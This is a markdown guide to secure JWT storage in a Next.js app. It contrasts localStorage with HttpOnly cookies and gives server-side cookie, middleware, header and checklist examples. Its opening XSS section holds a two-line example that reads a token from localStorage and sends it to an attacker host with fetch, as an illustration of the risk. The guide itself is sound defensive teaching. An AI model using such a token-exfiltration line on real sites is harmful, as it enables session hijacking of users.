# JWT Security Best Practices

## 🚨 **Why localStorage is NOT Secure**

### **XSS Vulnerability**
```javascript
// Malicious script can easily steal tokens from localStorage
const token = localStorage.getItem('jwt_token');
fetch('https://attacker.com/steal', { body: token });
```

### **No HttpOnly Protection**
- Any JavaScript can access localStorage
- Malicious browser extensions can read tokens
- XSS attacks can steal tokens instantly

## ✅ **Secure Approach: HttpOnly Cookies**

### **Benefits of HttpOnly Cookies:**
1. **XSS Protection**: JavaScript cannot access HttpOnly cookies
2. **Automatic Expiration**: Cookies can be set to expire
3. **CSRF Protection**: SameSite attribute prevents CSRF attacks
4. **Secure Transmission**: Secure flag ensures HTTPS-only transmission

### **Implementation:**

```typescript
// ✅ SECURE: Server-side cookie setting
export async function setAuthCookie(token: string, user: User) {
  'use server';
  
  const { cookies } = await import('next/headers');
  const cookieStore = await cookies();
  
  cookieStore.set('auth_token', token, {
    httpOnly: true,        // 🔒 Cannot be accessed by JavaScript
    secure: true,          // 🔒 HTTPS only
    sameSite: 'strict',    // 🔒 CSRF protection
    maxAge: 60 * 60 * 24 * 7, // 🔒 7 days expiration
    path: '/',
  });
}
```

## 🔐 **Security Comparison**

| Method | XSS Safe | CSRF Safe | Auto Expire | Secure |
|--------|----------|-----------|-------------|---------|
| localStorage | ❌ | ✅ | ❌ | ❌ |
| sessionStorage | ❌ | ✅ | ✅ | ❌ |
| HttpOnly Cookies | ✅ | ✅* | ✅ | ✅ |

*CSRF protection requires SameSite attribute

## 🛡️ **Additional Security Measures**

### **1. Token Rotation**
```typescript
// Rotate tokens on each request
export async function refreshToken() {
  const response = await fetch('/api/refresh-token', {
    credentials: 'include' // Include HttpOnly cookies
  });
  return response.json();
}
```

### **2. Short Expiration Times**
```typescript
// Short-lived access tokens
maxAge: 60 * 15, // 15 minutes

// Long-lived refresh tokens
maxAge: 60 * 60 * 24 * 30, // 30 days
```

### **3. Secure Headers**
```typescript
// Add security headers
const headers = {
  'Content-Security-Policy': "default-src 'self'",
  'X-Frame-Options': 'DENY',
  'X-Content-Type-Options': 'nosniff'
};
```

## 🚀 **Production Implementation**

### **1. Environment Variables**
```bash
# .env.local
NEXT_PUBLIC_API_URL=https://api.yourapp.com
COOKIE_SECRET=your-secret-key
JWT_SECRET=your-jwt-secret
```

### **2. Middleware Protection**
```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  const token = request.cookies.get('auth_token');
  
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}
```

### **3. Server Actions for Auth**
```typescript
// lib/auth-actions.ts
'use server';

export async function loginUser(email: string, password: string) {
  // Validate credentials
  const user = await validateUser(email, password);
  
  if (user) {
    // Set secure cookies
    await setAuthCookie(user.token, user);
    return { success: true };
  }
  
  return { success: false, message: 'Invalid credentials' };
}
```

## ⚠️ **Common Security Mistakes**

### **❌ DON'T:**
```typescript
// Storing sensitive data in localStorage
localStorage.setItem('jwt_token', token);
localStorage.setItem('user_password', password);

// Exposing tokens in URLs
window.location.href = `/dashboard?token=${token}`;

// Using weak encryption
const encrypted = btoa(token); // Base64 is NOT encryption!
```

### **✅ DO:**
```typescript
// Use HttpOnly cookies
await setAuthCookie(token, user);

// Use secure server actions
const result = await authenticateUser(credentials);

// Implement proper CSRF protection
const csrfToken = await getCSRFToken();
```

## 🔍 **Security Checklist**

- [ ] Use HttpOnly cookies for JWT storage
- [ ] Implement CSRF protection (SameSite cookies)
- [ ] Set secure cookie flags for HTTPS
- [ ] Use short expiration times for access tokens
- [ ] Implement token rotation/refresh
- [ ] Add Content Security Policy headers
- [ ] Validate all inputs server-side
- [ ] Use HTTPS in production
- [ ] Implement rate limiting
- [ ] Log security events
- [ ] Regular security audits

## 📚 **Additional Resources**

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Next.js Security Best Practices](https://nextjs.org/docs/going-to-production#security)
- [MDN HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
